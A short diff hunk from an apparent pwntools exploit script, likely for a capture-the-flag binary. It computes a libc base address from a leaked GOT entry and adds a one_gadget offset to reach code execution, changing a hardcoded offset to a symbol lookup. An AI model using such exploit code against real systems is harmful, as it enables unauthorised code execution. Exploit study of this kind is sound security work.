@@ -136,7 +136,7 @@ print('gets', hex(gets_got))
 libc_elf = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
 libc_rop = ROP(libc_elf)
 
-libc_base = write_got - 0x1111d0
+libc_base = write_got - libc_elf.symbols['write']
 one_gadget_addr = libc_base + 0xe6e79
 
 print(hex(libc_base))
